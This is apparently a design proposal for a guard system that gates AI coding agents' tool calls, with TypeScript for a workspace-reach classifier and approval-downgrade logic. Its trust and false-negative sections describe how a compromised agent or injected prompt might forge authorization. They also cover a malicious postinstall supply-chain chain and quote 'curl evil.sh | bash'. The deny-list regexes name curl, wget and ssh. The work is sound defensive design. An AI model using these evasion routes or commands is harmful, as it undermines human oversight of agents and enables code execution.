*The interesting case — an org that raised the ceiling to include `migrate`:* call 1 at t=0, target is the local `DATABASE_URL`, in-workspace, recency 100, specificity 60 → grade 60 → **allow**. Call 2 at t=30min: the warrant's 20-minute exp has passed → `verifyWarrant` rejects → **require_approval**. Even inside the window it dies twice more: the production DSN puts `production`/`postgres` into `systems_touched`, adding +10 and pushing effective risk past 84 (gate 7), and the target is outside `w.workspace_root` (gate 9). **Three independent mechanisms catch the same scope creep — and this is exactly why the grade is a MIN and not an average.** An average of directness 100 / specificity 0 / recency 100 would be 67 and would have let it through. `min(100, 0, …) = 0` does not.

#### Cost

- **Files touched:** `hooks/dashclaw_intent.py (NEW, ~120 lines) — UserPromptSubmit capture, mint POST, warrant temp-file write; 2s timeout, fails open to no-warrant`, `hooks/settings.json — wire the UserPromptSubmit event (5th event; only 4 wired today)`, `plugins/dashclaw/hooks/hooks.json — parity mirror, regenerated by `npm run bundles:refresh` (never hand-edited)`, `hooks/dashclaw_pretool.py:1631-1656 (_build_guard_context) — attach `intent_warrant`; :528-574 (_enrich_file) — stop hardcoding `reversible: True` so gate 8 means something for Write/Edit/MultiEdit`, `app/lib/validate.js:292-344 — whitelist `intent_warrant` {type:'string', maxLength:2048} in GUARD_INPUT_SCHEMA, else the field is silently stripped`, `app/lib/guard/types.ts:12-68 — typed `intent_warrant?: string` on GuardEvalContext`, `app/lib/guard/intent.ts (NEW) — deriveIntentEnvelope, signWarrant, verifyWarrant, gradeAlignment, isServerDeniedPath, withinRoot`, `app/lib/guard/evaluate.ts:1051 — applyIntentWarrantGrant, inserted between applyAllowGrants and applyOperatorApprovalGrant`, `app/lib/guard/caches.ts:198-215 — getIntentCeiling rides the existing single loadGeneralSettings read (zero extra round trips)`, `app/api/guard/route.ts — `?mint=intent` branch, mirroring the existing `?record=true` mode (route.ts:31-38)`, `app/lib/repositories/settings.repository.ts:109 — 3 keys into VALID_SETTING_KEYS (INTENT_WARRANT_MODE, INTENT_WARRANT_CEILING, INTENT_WARRANT_MIN_GRADE)`, `app/lib/sessions.ts — recordIntentEvent (best-effort session_events insert; no direct SQL in routes, per CLAUDE.md)`, `app/lib/guardrails/packs/catastrophe-only/policies.yml — add `ungrantable: true` to hold_secret_file_writes (verified ABSENT today; without it a warrant could theoretically reach a secret-file write)`, `app/approvals/page.tsx:511 — provenance line under each pending card's declared_goal headline`, `app/decisions/[actionId]/page.tsx — 'Attributed to' row: prompt, elapsed, grade breakdown (the forgery-detection surface)`, `app/policies/components/PresetsShields.tsx:44-80 — 'Trust my own requests' 3-position control in the existing shield grid`, `__tests__/unit/guard-intent-warrant.test.js (NEW) — all five scenarios pinned, plus forged-envelope, expired-warrant, denied-path, ungrantable and block-immunity cases`, `__tests__/fixtures/risk-calibration-golden-vectors.json — seed the synonym table from the 8 real dated incidents already in the corpus`, `docs/architecture/trust-and-failure-model.md — record the D1 dual (client text may only NARROW authority)`, `docs/decisions/2026-08-11-intent-warrants.md — the ADR`, `HUMAN-EXPERIENCE.md — the four answers; README.md / PROJECT_DETAILS.md — no count changes (all surfaces net zero)`
- **Surface budget:** **Net zero against every budgeted ceiling — which matters, because I verified with `node scripts/check-surface-budget.mjs` that all eight are at exactly 100% right now: apiRoutes 131/131, appPages 53/53, mcpTools 17/17, mcpResources 3/3, sdkNode 39/39, sdkPython 59/59, cliCommands 14/14, guardPolicyTypes 16/16.** Any single new route, page, or policy type fails the build.

- **API routes: 0.** `?mint=intent` is a query-param mode on the existing `POST /api/guard`, the same precedent as `?record=true` (route.ts:31-38, 256-259). Confirmed in `scripts/lib/api-route-inventory.mjs:124-148` that `discoverApiRoutes` walks route **files** and counts one entry per file with ≥1 method — a new mode on an existing file registers as zero. *Stated honestly:* if the maintainer judges this a smuggled endpoint, the clean version is `POST /api/intent` at +1/131 with a THESIS.md amendment. I think the query-param mode is right and the precedent is already in that exact file, but I am not going to pretend the question doesn't exist.
- **Guard policy types: 0.** This is the single biggest design constraint and it decided the architecture. The obvious "evidence-not-downgrade" variant needs an `intent_alignment` policy type — 17/16, build fails, THESIS amendment required, *and* it reproduces `allow_grant`'s fatal flaw by making the human pre-author a policy before the shape has ever occurred. A post-pass costs zero and inherits every existing safety gate.
- **App pages: 0.** Three edits to `/approvals`, `/decisions/[actionId]`, `/policies`.
- **MCP tools / resources, Node SDK, Python SDK, CLI commands: 0.** Nothing here is agent-callable by design — an SDK method to mint a warrant would hand the governed agent a first-class forgery API.
- **Not budgeted, so free but worth naming:** 1 new hook event (UserPromptSubmit), 1 new hook script, 3 settings keys, 1 new `app/lib/guard/*` module, 1 new session_event type, 1 YAML field on an existing policy.

`npm run surface:check` stays green with no ceiling raised and no THESIS amendment.
- **Human surface:** Three existing pages, zero new ones. Every step is a click.

**1. The control — `/policies` → Shields.** Click path: left nav → **Policies** → the **Shields** grid (`app/policies/components/PresetsShields.tsx`, already a 10-toggle grid wired to a PATCH at :44-80). A new tile: **"Trust my own requests"**, three positions — *Off* (default) / *Routine work* / *Routine work + deploys*. Subtitle in plain language: *"When something you just asked for is safe, reversible, and inside this project, run it without asking. Never for blocked actions, secrets, or anything outside your workspace."* One click sets `INTENT_WARRANT_CEILING`. Flipping it back to Off kills every outstanding warrant within 30 seconds, with no revocation list — gate 6 re-reads the setting on every evaluation.

**2. The payoff — `/approvals`.** Click path: nav → **Approvals** (the hero surface). Under each pending card's `declared_goal` headline (`app/approvals/page.tsx:511`), one new line:
- *"Because you said: 'fix the flaky auth test' — 4 min ago. Alignment 20/100: you asked about tests, this is a network call."*
- or *"No request of yours covers this. Last message 3h 12m ago."*

**This is the design's most valuable surface even on the calls where the warrant does not fire.** Today the owner approves blind — the card tells him *what* the agent wants, never *why it thinks he asked*. After this, every card he is asked to judge carries its own attribution, including the honest "nothing you typed covers this," which is the strongest single reason to hit Deny.

**3. The audit — `/decisions/[actionId]`.** Click path: nav → **Decisions** → any row. The causal chain gains an **"Attributed to"** row: the human's literal prompt, elapsed time, and the three grade components (directness / specificity / recency) with the weakest one called out. This is the forgery-detection surface — a prompt the owner never typed, sitting under his own turn, is visible in one glance.

**Zero-terminal test:** the owner's entire role is one toggle on /policies and reading one line on /approvals. Terminal commands required: **0.** GitHub visits: **0.** No API-only decision is being recorded, because none is needed.

**Rendered proof** is part of the same change, per `HUMAN-EXPERIENCE.md` clause 4: drive `/approvals` with a real minted warrant via the frontend-verify skill and confirm both the fired ("Because you said…") and unfired ("No request of yours covers this") variants render with live data, and that the /policies toggle round-trips.
- **Why it beats the obvious:** **Lowering the threshold moves the whole distribution.** `rm -rf ./dist` and `rm -rf ~/.config` are 35 points apart on the server's own scale (65 vs 100) — but recon proved the client can pin *either* to 100, and did, identically, 11 and 15 times, on benign commands (`cd`-prefixed chains, `npx vitest run`). There is no threshold value that separates S1 from S3, because **the separating variable is not in the risk score at all.** It is "did a human ask for this, how recently, and how specifically" — and `GuardEvalContext` has no field for any of it (types.ts:12-68, confirmed against the enforced whitelist in validate.js:292-344, not just the type file). You cannot tune your way to a signal you never collected.

**Turning policies off is not hypothetical — it is the only usage event in the product's history.** THESIS records the reference deployment running with *all policies off for 18 days* because the default pack fired an approval every ten seconds. Falsifier #1 is >50% of installers disabling enforcement in week one. "Just lower it" and "just turn it off" are the same move at different speeds, and both trade S3 away to buy S1.

**Every relief mechanism already shipped is retrospective or pre-declarative — that is why none of them fixed this.** `allow_grant` needs a grant hand-authored *before the shape has ever occurred once*. `applyOperatorApprovalGrant` needs a prior approval within 15 minutes on a byte-identical `declared_goal`. Plan grants need the agent to have submitted a plan the owner reviewed — and the standard pretool path never auto-submits one (RFC 2026-07-06:104). Policy-tuning and posture-loosening both need ≥10 prior fired interruptions plus ≥5 resolved outcomes at a 90-95% override rate, and by their own comments neither can ever see a block-type policy. The calibration controller is off by default, has no UI toggle anywhere, and by its own docblock can *only raise*. **The system has zero channel through which "I personally asked for this" lowers a decision on its first occurrence.** Intent Warrants add exactly that one channel and nothing else.

**Against a policy-tuning-first rival:** tuning changes the *standing* posture. It cannot tell S1 from S3 either, because both are `cleanup`-shaped `rm -rf` calls — the only thing separating them is a human who typed something eleven seconds earlier. A tuned policy that stops asking about `rm -rf` stops asking in hour four of the unattended run too.

**Against a "make containment the default" rival:** containment defers the click, it does not remove it. The promotion merge is *unconditionally* raised to require_approval (evaluate.ts:1024-1033, no exception for any grant), and `isContainableAct` structurally excludes deploys, migrations and anything with a risk flag — precisely the class in the complaint. One interrupt becomes silent execution plus a still-required interrupt later.

**And critically, my design does not have to win the security argument on new ground.** `allow_grant` already establishes that this exact envelope — non-block, non-ungrantable, org-configured — is acceptable authority to grant standing. Intent Warrants are strictly narrower than `allow_grant` on four axes (they add a 20-minute decay, a target-scope check, a server-graded reversibility requirement, and an evidence-only gate) and add zero new authority. The only thing that changes is *who selects which slice of a pre-set ceiling is live right now* — the human's own typed request, instead of a grant he was supposed to have written before he knew he needed it.

#### Failure modes

- The classifier misfire is the owner's real pain and this design does not reach it. Recon's hardest evidence is 8/8 benign golden vectors pinned to risk 100 by the blunt-70 unknown-command fallback and naive substring matching (bash_classifier.py:79-82, 378-380) — `git show --format=`, `Get-Content -Tail`, `-Recurse:$false`. Those land on `block`, and gates 1 and 7 both refuse. Shipping Intent Warrants without the classifier fix leaves the loudest complaint untouched and looks like a miss.
- Vocabulary drift between the mint mapper and the risk engine. `deriveIntentEnvelope` maps prose to action_types; `bash_classifier` + `evidence.ts` map commands to action_types. If they diverge, warrants silently stop matching. Recon already documented the live version of this: neither classifier has a branch for `npm run <script>` or `npx <pkg>`, so both fall to a base-30 `other` that overwrites the declared `build` via the mismatch swap (evaluate.ts:849-871). A warrant saying {build} then fails directness against `other`. Mitigation: the mapper emits the same vocabulary the mismatch swap can produce, and a test asserts round-trip on every golden vector — but this is the most likely thing to rot.
- Warrant staleness inside one long turn. A single Claude Code turn routinely runs longer than 20 minutes. The warrant expires mid-turn and interruptions resume with no explanation the owner will connect to anything. He will read it as 'the feature stopped working.' The /approvals provenance line must say 'stale request (23 min)' explicitly, or this reads as flakiness.
- The UserPromptSubmit hook adds latency to every keystroke-submit. A 2s timeout on a cold server or a hosted round-trip means the owner waits before his own prompt is processed. Must be fire-and-forget with a hard 2s cap, failing open to no-warrant. If it ever blocks the prompt, the feature is uninstalled within a day.
- Installed hooks are COPIES. `hooks/settings.json` changes need `install-hooks --global` plus a session restart. A half-installed state — new pretool sending `intent_warrant`, no intent hook minting one — is a silent no-op that looks like the design failing. `enforcement_liveness_probe.py` verifies the PreToolUse seam but has no notion of the mint hook.
- The `?mint=intent` mode shares the guard route's org rate limiter. A chatty session could exhaust the agent's budget on mints and start failing real guard calls. Needs its own cheap counter or an exemption, decided explicitly rather than inherited.
- Prompt text now leaves the machine and is stored. The owner's literal typed words go into `session_events` — including anything he pastes, which is exactly where secrets get pasted. The mint MUST run `scanSensitiveData` (already used at route.ts:378) and redact before persisting, and the /decisions excerpt must be capped and redacted. Getting this wrong turns a governance feature into a secret-exfiltration path.
- `min()` grading is brittle at the boundary. A single un-prefixed target drops specificity 100 → 0 and the whole grade to 0. Correct, but it means one stray temp-file path in an otherwise perfectly-aligned action reintroduces the interrupt — and the owner will not understand why the identical command was allowed a minute earlier. The provenance line must name the offending path.
- Ceiling misconfiguration is one click from broad. 'Routine work + deploys' puts `deploy` and `migrate` inside the envelope, and S5's first call then auto-allows. The three positions must be worded so the second one reads as the serious choice it is, and the /decisions ledger must make ceiling-widened grants visually distinct.

---

### Task Envelope Authorization (Reach-Bounded Envelopes)

> When you type an instruction, DashClaw quietly opens a 30-minute "you're steering" envelope, and anything the agent does inside your own working folder runs without asking — while anything that reaches the network, another machine, production, or your home directory still stops and asks, every single time.

#### Core mechanism

Two moves, one seam each.

**Move 1 — capture human presence out-of-band.** DashClaw wires a 5th Claude Code hook event, `UserPromptSubmit` (today `hooks/settings.json` wires only PreToolUse/PostToolUse/Stop/SessionStart). A new `hooks/dashclaw_prompt.py` reads `data.prompt` — the human's literal typed text, verified live at `C:/Users/sandm/.claude/hooks/scope-lock.cjs:67-68` — and POSTs it to mint a **task envelope** row keyed on `(org_id, agent_id, harness_session_id)`. It fires before the agent's turn begins. The governed model never authors it and cannot suppress it.

**Move 2 — the envelope's authority is CONSTANT, so there is nothing to infer and nothing to review.** This is the design's sharpest commitment. The prompt text does not widen the envelope. Every envelope, from every prompt, grants exactly the same thing: `reach_ceiling = R0_WORKSPACE`, TTL 30 min (clamp 120), budget 40 downgrades (clamp 200). The prompt is a **presence-and-direction attestation**, not a capability grant. The stored excerpt (redacted via the existing `redactAny`) exists only so the human-facing card can say *why* something was covered.

Authorization is by **reach**, not by score. `app/lib/guard/reach.ts` grades the act server-side from its own bytes, reusing `classifyAct()`'s existing `flags` vocabulary (`evidence.ts:481`):
- **R0 WORKSPACE** — shell/file act, every path token provably relative (no `..`, no `~`, no `/`, no drive letter), no dangerous evidence flag, no URL/host literal, no deploy/migrate/publish/privilege verb, not a supply-chain file (`package.json`, `.github/**`, `.git/hooks/**`).
- **R1 MACHINE / R2 SHARED / R_UNKNOWN** — everything else, including *any act with no attached act payload*.

Only R0 is ever covered. This deliberately sidesteps the thing recon proved is broken: the risk number itself (blunt-70 fallback, `--format=` substring hits, `systems_touched` dead code, the `build→other` evidence swap). Reach is computed from what will actually execute.

The envelope then downgrades `require_approval → allow` in a post-pass modeled line-for-line on `applyOperatorApprovalGrant` (`evaluate.ts:378-424`): atomic single-decrement consumption, never touches `block`, never runs in simulate, fails soft. Refusals are recorded too — that's what feeds the "Widen" list on `/approvals`.

#### Decision function

```ts
// ─────────────────────────────────────────────────────────────────────────────
// NEW FILE: app/lib/guard/reach.ts   (pure, synchronous, unit-testable)
// ─────────────────────────────────────────────────────────────────────────────
import { classifyAct } from './evidence';           // evidence.ts:481
import type { GuardEvalContext } from './types';

export type Reach = 'R0_WORKSPACE' | 'R1_MACHINE' | 'R2_SHARED' | 'R_UNKNOWN';

// Evidence flags that prove effects are NOT confined to the working tree.
// Sourced from evidence.ts's own flag vocabulary (classifyShellSegment ~239-331,
// classifyFile ~461-475, classifySql ~440-457). NOTE: 'destructive' is
// deliberately ABSENT — `rm -rf ./dist` is destructive AND workspace-local.
const NON_R0_FLAGS = new Set([
  'protected_target', 'vcs_dangerous', 'deploy', 'secret_exposure',
  'sensitive_path', 'privilege', 'device_write', 'interpreter_destructive',
  'ci_config', 'ddl', 'whereless',
]);

// Envelope-only denylist: workspace-relative but supply-chain load-bearing.
// Closes the "write a postinstall, then npm install" chain (see failure modes).
const NEVER_R0_PATH_RE =
  /(^|[\\/])(package(-lock)?\.json|pnpm-lock\.yaml|yarn\.lock|pyproject\.toml|poetry\.lock|Cargo\.toml|Makefile|Dockerfile|\.git([\\/]|$)|\.github([\\/]|$)|\.claude([\\/]|$)|hooks?[\\/])/i;

const NON_LOCAL_VERB_RE =
  /\b(migrat\w*|deploy|publish|release|prod|production|ssh|scp|rsync|curl|wget|kubectl|helm|terraform|vercel|aws|gcloud|sudo|apt|apt-get|brew|dnf|yum|choco|winget)\b|docker\s+push|npm\s+(publish|login|link)|--global\b|(^|\s)-g(\s|$)/i;

const URL_OR_HOST_RE = /[a-z][a-z0-9+.-]*:\/\/|@[\w.-]+:|\b\d{1,3}(\.\d{1,3}){3}\b/i;

// The server does NOT know cwd, so it refuses to guess: an absolute path that
// happens to sit inside the repo is conservatively NOT R0. False negatives here
// cost interrupts, never safety.
function isWorkspaceRelative(tok: string): boolean {
  if (!tok) return false;
  if (/^[~/\\]/.test(tok)) return false;              // ~/... , /... , \...
  if (/^[A-Za-z]:[\\/]/.test(tok)) return false;      // C:\...
  if (/(^|[\\/])\.\.([\\/]|$)/.test(tok)) return false;
  if (NEVER_R0_PATH_RE.test(tok)) return false;
  return true;
}
const ROOT_TARGET_RE = /^(\.|\.[\\/]|\*|\.[\\/]\*)$/;  // `rm -rf .` is never R0

export function computeReach(context: GuardEvalContext): { reach: Reach; basis: string } {
  const act = context.act as { kind?: string; command?: string; file?: { path?: string } } | undefined;
  if (!act || typeof act !== 'object') return { reach: 'R_UNKNOWN', basis: 'no act attached' };

  const flags = new Set(classifyAct(act)?.flags ?? []);
  for (const f of flags) if (NON_R0_FLAGS.has(f)) return { reach: 'R2_SHARED', basis: `evidence flag "${f}"` };

  if (act.kind === 'http') return { reach: 'R2_SHARED', basis: 'network egress' };
  if (act.kind === 'sql')  return { reach: 'R2_SHARED', basis: 'database statement' };

  if (act.kind === 'file') {
    const p = act.file?.path ?? '';
    return isWorkspaceRelative(p)
      ? { reach: 'R0_WORKSPACE', basis: `workspace-relative write ${p}` }
      : { reach: 'R1_MACHINE',   basis: `write outside the working tree (${p})` };
  }
  if (act.kind !== 'shell' || typeof act.command !== 'string') {
    return { reach: 'R_UNKNOWN', basis: `unhandled act kind ${String(act.kind)}` };
  }

  const cmd = act.command;
  if (URL_OR_HOST_RE.test(cmd))     return { reach: 'R2_SHARED', basis: 'command names a remote host' };
  if (NON_LOCAL_VERB_RE.test(cmd))  return { reach: 'R2_SHARED', basis: 'deploy/migrate/publish/privilege verb' };
  for (const tok of pathLikeTokens(cmd)) {            // reuses evidence.ts chain-split + rmDeleteTargets
    if (ROOT_TARGET_RE.test(tok))   return { reach: 'R1_MACHINE', basis: 'targets the workspace root itself' };
    if (!isWorkspaceRelative(tok))  return { reach: 'R1_MACHINE', basis: `non-relative path token ${tok}` };
  }
  // `cd / && rm -rf dist` — a directory change re-roots every later relative token.
  if (dirChangeTargets(cmd).some((t) => !isWorkspaceRelative(t))) {
    return { reach: 'R1_MACHINE', basis: 'changes directory outside the working tree' };
  }
  return { reach: 'R0_WORKSPACE', basis: 'shell act confined to workspace-relative paths' };
}

// ─────────────────────────────────────────────────────────────────────────────
// app/lib/guard/evaluate.ts — NEW post-pass, inserted between
// applyOperatorApprovalGrant (~379) and applyPlanStepGrant (~439).
// Structural twin of applyOperatorApprovalGrant (evaluate.ts:378-424).
// ─────────────────────────────────────────────────────────────────────────────
export type EnvelopeGrantInfo = {
  envelope_id: string; prompt_excerpt: string; minted_at: string;
  used: number; budget: number; reach: Reach;
};

async function applyTaskEnvelopeGrant(
  deps: GuardPhaseDeps, acc: GuardAccumulator,
): Promise<EnvelopeGrantInfo | null> {
  const { context, sql, orgId } = deps;

  // ── The ONLY decision this pass can produce is require_approval -> allow. ──
  // block:            untouched (constitutional, MAINTAINER.md "blocks are absolute")
  // allow_contained:  untouched (severity 2 < require_approval; already non-interrupting)
  // warn:             untouched (warn does not interrupt; nothing to buy)
  // allow:            nothing to do
  if (acc.highestDecision !== 'require_approval') return null;

  // Parity with applyAllowGrants (:307) and applyPlanStepGrant (:469):
  // a containment merge is never covered by a standing grant.
  if (context.action_type === 'containment_promote') return null;
  if (context.declared_action_type === 'containment_promote') return null;

  // F1 ungrantable gate — reused verbatim from applyAllowGrants (:308-316).
  // Control-plane + catastrophe rules survive every envelope.
  const ungrantable = acc.gatingPolicies.find((g) => g.ungrantable);
  if (ungrantable) {
    acc.warnings.push(`${ungrantable.name}: marked ungrantable — a task envelope cannot clear this verdict`);
    return null;
  }

  const sessionId = typeof context.harness_session_id === 'string' ? context.harness_session_id : '';
  if (!context.agent_id || !sessionId) return null;   // no session binding -> no envelope

  const { reach, basis } = computeReach(context);
  const actHash = computeActContentHash(context.act);

  // FAIL-CLOSED: R_UNKNOWN is treated exactly like R2. An act whose reach
  // cannot be proven from its own bytes is outside every envelope, always.
  if (reach !== 'R0_WORKSPACE') {
    await recordEnvelopeRefusal(sql, orgId, { agentId: context.agent_id, sessionId, reach, basis, actHash });
    acc.warnings.push(`Outside the current task envelope (${reach}: ${basis})`);
    return null;                                       // require_approval STANDS
  }

  // Atomic single-decrement consumption — same UPDATE...WHERE...RETURNING race
  // shape as applyOperatorApprovalGrant (:387-408) and consumePlanStepGrant.
  //   UPDATE task_envelopes SET used = used + 1, last_used_at = NOW()
  //    WHERE envelope_id = (SELECT envelope_id FROM task_envelopes
  //                          WHERE org_id=$1 AND agent_id=$2 AND harness_session_id=$3
  //                            AND status='live' AND expires_at > NOW() AND used < budget
  //                          ORDER BY minted_at DESC LIMIT 1)
  //      AND org_id=$1 AND status='live' AND expires_at > NOW() AND used < budget
  //  RETURNING envelope_id, prompt_excerpt, minted_at, used, budget;
  const grant = await consumeEnvelopeBudget(sql, orgId, { agentId: context.agent_id, sessionId, actHash });
  if (!grant) return null;   // none live / expired / exhausted / revoked / superseded -> require_approval STANDS

  acc.warnings.push(
    `Covered by task envelope ${grant.envelope_id} — "${grant.prompt_excerpt}" ` +
    `(${grant.used}/${grant.budget} actions, workspace-only) — require_approval downgraded to allow`,
  );
  acc.matchedPolicies.push('builtin:task_envelope');
  acc.highestDecision = 'allow';
  // T6 parity: keep the gating reasons as forensic warnings, don't discard.
  acc.warnings.push(...acc.reasons.map((r) => `superseded by envelope: ${r}`));
  acc.reasons.length = 0;
  return { ...grant, reach };
}

// ─────────────────────────────────────────────────────────────────────────────
// CALL SITE — evaluate.ts ~1051-1074, one inserted line.
// ─────────────────────────────────────────────────────────────────────────────
applyAllowGrants(policies, context, liveAcc);                      // :1051 unchanged
if (!options.simulate) {
  if (evaluationAbandoned) return 'completed';
  await timed('grants', () => applyOperatorApprovalGrant(deps, liveAcc));   // :1060 unchanged
  if (evaluationAbandoned) return 'completed';
  envelopeGrant = await timed('envelope', () => applyTaskEnvelopeGrant(deps, liveAcc));  // ◀ NEW
  if (evaluationAbandoned) return 'completed';
  planGrant = await timed('plan_grant', () => applyPlanStepGrant(deps, liveAcc));        // :1074 unchanged
}

// ── COMPOSITION WITH THE EXISTING LATTICE ───────────────────────────────────
// 1. max()/D1 fold (risk.ts:87-94, 193-198): COMPLETELY UNTOUCHED. The envelope
//    never contributes a risk term, never lowers one, never reads risk_score.
//    computeEffectiveRisk / computeRiskAssessment are not edited at all.
// 2. raiseDecision (evaluate.ts:106-108) still one-directional. Every raising
//    phase — runLocalPolicies, scanPromptInjection, containment_promote,
//    runWebhookPolicies, runCalibrationController — has already run and is
//    unmodified. The envelope only reads the settled accumulator.
// 3. Ordering is deliberate. Operator approval runs FIRST (a human clicked on
//    THIS act — most specific wins). Envelope runs SECOND. Plan grants run
//    LAST, which is a free win: when the envelope already downgraded to allow,
//    applyPlanStepGrant's consumption branch short-circuits on
//    `acc.highestDecision !== 'require_approval'` (:513) and a precious
//    operator-reviewed plan grant is NOT burnt on an action the cheap envelope
//    budget already covered.
// 4. An operator's explicit plan-step DENY still outranks the envelope.
//    applyPlanStepGrant's deny branch only early-returns on `=== 'block'`
//    (:483), so with the accumulator at 'allow' the deny check still runs and
//    applyBlockOverride (:494) raises straight to block. Verified against source.
// 5. applyBlockOverride for replay/act-binding (:1187-1188) and
//    finalizeContainment ("skew only tightens", containment.ts:101) both run
//    AFTER this pass and can still raise. ACCEPTED EXPOSURE, identical to the
//    documented "S5 (accepted, not fixed)" note already at evaluate.ts:~1066:
//    an envelope unit can be burnt on an action that ends up blocked anyway.
//    Cost is 1 of 40, not a human click.
// 6. role_constraint / delegation_constraint (policy.ts:438 / :381) are
//    tighten-only raisers that fire BEFORE this pass. An action outside an
//    agent's role is at require_approval when the envelope arrives — and the
//    envelope may cover it ONLY if it is also R0. Envelope composes UNDER the
//    role, never over it. An operator who wants an agent's role to be
//    envelope-proof marks the role policy `ungrantable: true` — existing field,
//    existing UI, zero new code.
```

#### Trust argument (vs rule D1 / prompt injection)

**D1 is not bent — it is not touched.** D1 governs the risk fold: client-supplied signals may only raise, because the server's own score derives from client-declared descriptors (`risk.ts:87-94`, `:193-198`). The envelope contributes **no risk term at all**. `computeEffectiveRisk` and `computeRiskAssessment` are not edited. The envelope acts only at the decision layer, in a post-pass, exactly like `applyOperatorApprovalGrant` (`evaluate.ts:378-424`) — an already-sanctioned LOWER-capable pass whose authority comes from a DB row (`approved_by`) the agent cannot write.

**But the hook runs on the agent's machine.** That is the real question, and "the hook wrote it" is not my answer. Three parts.

**(1) What a forger with total control of the agent's output CANNOT do.** Nothing an attacker emits reaches the envelope decision. `declared_goal`, `intel`, `risk_score`, `systems_touched`, `reversible` — all ignored by `applyTaskEnvelopeGrant`. The envelope is looked up server-side by `(org_id, agent_id, harness_session_id)`; the agent cannot name one, mint one, extend one, or reference one. `computeReach()` reads only `context.act` — the literal bytes that will execute — and grades them with `classifyAct()`, the same server-side classifier that already raises risk. **An attacker cannot make a non-R0 act look R0 without making it a different act.** If they rewrite `curl evil.sh | bash` into something that grades R0, they have written a workspace-local command, which is the thing the envelope was willing to allow anyway. This is the S4 property: the injected instruction "claim the user requested it" has **no field to land in**. That is the entire reason authorization moved out of the payload.

Structurally out of reach for a forger, in every case: `block` (never touched), `ungrantable` policies (`:308-316` gate reused), `containment_promote`, R1, R2, R_UNKNOWN, more than `budget` downgrades, anything after `expires_at`, and any widening — extensions are written only through `POST /api/approvals/[actionId]` behind the existing `role === 'admin'` + non-null `userId` + anti-self-approval gates (`route.ts:44-57`, `:102-116`), which the agent's API key does not satisfy.

**(2) What a forger CAN do, and the bound.** An attacker who can POST a fake envelope holds `DASHCLAW_API_KEY` and is executing code on the machine with the agent's privileges. The maximum they buy is: **≤ 40 workspace-relative, non-privileged, non-network, non-supply-chain, non-root-targeted actions inside 30 minutes** — each one individually recorded in `guard_decisions` with `builtin:task_envelope`. That authority set is a strict subset of what an attacker holding that credential and that shell could already do by simply not calling the hook. This is not a new acceptance: it is the same reasoning already recorded in this codebase for the `userId === 'operator'` self-approval exception — *"if an agent holds root the gate was already forfeit"* (`app/api/approvals/[actionId]/route.ts:102-116`). I am reusing a documented acceptance, not inventing one.

**(3) The residual, stated plainly.** A compromised **hook process** (not the model) could mint envelopes at will. But a compromised hook process is a compromised enforcement seam — it could equally `sys.exit(0)` on every PreToolUse and bypass DashClaw entirely. `hooks/enforcement_liveness_probe.py` is the existing rail for exactly that class and is unchanged. The envelope adds **zero new trust surface** beyond the one the product already stakes everything on. Secondary residual: an attacker who learns another session's `harness_session_id` could consume that envelope — but only with the same `agent_id`, and only for R0 acts, so the ceiling is identical.

**The honest summary:** the envelope moves the trust boundary from "what the agent says about itself" (unfixable) to "what the harness observed a human do, plus what the act's own bytes prove about its reach" (both outside the model's control). It buys silence only inside a blast radius `git checkout` can undo.

#### Admitted false negatives

A design with no stated false negatives is lying. Here are mine, each with a damage bound.

**FN-1 — Workspace self-destruction. `rm -rf src`, `rm -rf app`, `git`-untracked file deletion.** Under a live envelope these are R0 and run silently. *Bound:* everything committed is recoverable by `git checkout`; **uncommitted edits and untracked files are lost.** Real, and the worst thing on this list. Partial mitigation shipped: `rm -rf .` / `rm -rf *` are demoted to R1 by `ROOT_TARGET_RE`, so the whole-tree case still interrupts. Not mitigated: the sub-directory case.

**FN-2 — Mass in-place rewrite.** `sed -i` / `find . -name '*.ts' -exec ...` across the tree. Same class, same bound: git-recoverable for committed state, silent for uncommitted.

**FN-3 — Supply-chain via workspace files (partially closed).** The concrete chain is: envelope-covered write to `package.json` adding a malicious `postinstall`, then envelope-covered `npm install` → RCE at user privilege. I close the named chain with `NEVER_R0_PATH_RE` (`package.json`, lockfiles, `pyproject.toml`, `Makefile`, `Dockerfile`, `.git/**`, `.github/**`, `.claude/**`, `hooks/**` are never R0). *Residual:* a project-specific executable config I did not enumerate — a `vitest.config.ts` with a side-effecting import, a `conftest.py`, a `.mocharc.js`. **This is the strongest remaining attack and I do not claim to have closed it.** Bound: needs ≥2 covered actions in one envelope, both recorded with `builtin:task_envelope` and both visible on `/decisions` and the `/approvals` stream.

**FN-4 — Budget-window volume.** Up to 40 workspace mutations before the envelope exhausts and every interrupt returns. The existing `rate_limit_runaway_safety` (200 evaluations / 10 min) still fires independently — it counts `guard_decisions` regardless of decision, so envelope-covered actions still feed it.

**FN-5 — Session-id reuse.** An attacker knowing another live session's `harness_session_id` and its `agent_id` consumes that envelope. Bound: identical to FN-1..4; no reach escalation.

**FN-6 — Reach-classifier gaps.** `computeReach` is regex-and-flag based. A shell form that escapes both `NON_LOCAL_VERB_RE` and `URL_OR_HOST_RE` while still reaching outward — an obscure exfil binary, a shell function defined earlier in the session, base64-decoded arguments — grades R0 wrongly. *Bound:* this is the same adversarial surface `bash_classifier.py` and `evidence.ts` already carry, so it inherits their existing hardening and their existing golden-vector regression corpus; it does not create a new one. I ship `__tests__/fixtures/envelope-reach-vectors.json` pinning all 8 known-false-positive incidents plus S1–S5 so regressions are caught.

**FN-7 — The deliberate ones, which are features.** Everything Claude Code's own permission prompt would have caught, DashClaw now stays silent on **while a human typed in the last 30 minutes** — precisely the window THESIS says is not the wedge. And the envelope grants nothing to Codex or Claude Desktop (no `UserPromptSubmit` equivalent), so those runtimes keep today's exact behavior.

#### Five-scenario walkthrough

**S1 — "clean out the build artifacts" → `rm -rf ./dist ./node_modules/.cache` → ALLOW.**
Envelope live (minted at the prompt, ~0-30 min old). Policy layer runs completely unchanged and raises `require_approval` at risk 100 as it does today. Post-pass: `classifyAct` flags `destructive` — which is deliberately *not* in `NON_R0_FLAGS`, because destructive-and-workspace-local is exactly the complaint. `protected_target` does not fire (neither target is a root/home path). Both tokens are relative, no `..`, no URL, no deploy/migrate verb, neither matches `NEVER_R0_PATH_RE`. Reach = R0. Budget 1/40 consumed. **allow.** *Caveat stated honestly: if the org's pack maps 100 → `block` (bare catastrophe-only does), the block STANDS — the envelope never unblocks. The `/approvals` card says so and points at the existing loosening rail.*

**S2 — "ship it" → `git push --force-with-lease origin main` → REQUIRE_APPROVAL** (block under bare catastrophe-only).
